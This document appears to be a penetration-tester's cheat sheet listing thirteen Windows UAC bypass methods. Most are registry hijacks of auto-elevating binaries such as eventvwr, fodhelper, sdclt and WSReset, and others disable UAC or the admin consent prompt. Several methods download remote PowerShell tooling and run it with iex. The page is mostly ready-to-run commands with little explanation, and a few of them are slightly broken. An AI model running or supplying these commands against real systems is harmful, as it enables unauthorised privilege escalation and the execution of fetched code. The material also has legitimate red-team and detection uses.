
Generally speaking, most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UACprompt. A feature called **AutoElevate** allows specific binaries to elevate without requiring user's interaction.  


#### Command to check if UAC is enabled :
```python
reg query hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Output :
```ruby
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
 UAC is enabled 


```ruby
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x0
```
UAC is Disabled 

## 1.Bypass using event viewer
```powershell
set CMD="Command or Binary to be run"

reg.exe add "hkcu\software\classes\.pwn\shell\open\command" /ve /d %CMD% /f

reg.exe add "hkcu\software\classes\mscfile\CurVer" /d ".pwn" / 

cmd.exe /c eventvwr.msc
```


#### Clearup Command:
```powershell
reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
```


## 2. Bypass UAC using fodHelper

fodhelper tries to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user's context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.
```powershell
set CMD="C:\Windows\System32\calc.exe"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "C:\Windows\System32\cmd.exe" /f



cmd.exe /c fodhelper.exe
```



#### Clearup Command :
```powershell
reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1

reg.exe delete hkcu\software\classes\.thm /f >nul 2>&1
```



## 3. Bypass UAC using ComputerDefaults
```powershell
New-Item  -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```


#### Clearup Command:
```powershell
Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
```



## 4. Bypass UAC by mocking trusted directories:
```powershell
mkdir "\\?\C:\Windows \System32\"
copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"

```

#### Clearup command:
```powershell
rd "\\?\C:\Windows \" /S /Q >nul 2>nul
```




## 5.Bypass UAC using sdclt DelegateExecute
```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command_to_execute}'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
```


#### Clearup Command:
```powershell
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
```



## 6.  Disable UAC using reg.exe
```powershell
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```


#### Clearup Command :
```powershell
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
```




## 7. UAC Bypass with WSReset Registry Modification
```powershell
New-Item #{commandpath} -Force | Out-Null
New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
```



#### Clearup Command :
```powershell
Remove-Item #{commandpath} -Recurse -Force
```


## 8. Disable UAC admin consent prompt via setting ConsentPromptBehaviourAdmin registry key to 0
```powershell
$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
```



#### Clearup Command :
```powershell
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
```



## 9. Bypass UAC with DccwBypassUAC technique
```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
```



## 10. winpwn - UAC Bypass disk cleanup technique 
```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
```



 
## 11. winpwn - UAC Magic
```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
```





## 12. Winpwn - UAC Bypass ccmstp technique
```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "<malicious command>" -technique ccmstp
```



## 13. UAC Bypass using Disk Cleanup Scheduled Task.
```powershell
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c calc.exe &REM " /f

schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```


#### Clearup Command:

```batch
reg delete "HKCU\Environment" /v "windir" /f
```

## Automation :


[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
